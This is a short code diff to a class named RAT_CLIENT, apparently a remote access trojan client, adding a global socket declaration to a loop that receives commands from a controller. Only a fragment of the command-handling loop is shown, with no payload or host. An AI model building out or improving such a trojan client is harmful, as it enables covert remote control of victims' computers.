@@ -65,6 +65,7 @@ class RAT_CLIENT:
                     ctypes.windll.kernel32.Sleep(500)
     
     def execute(self):
+        global s
         while True:
             command = s.recv(1024).decode()
             
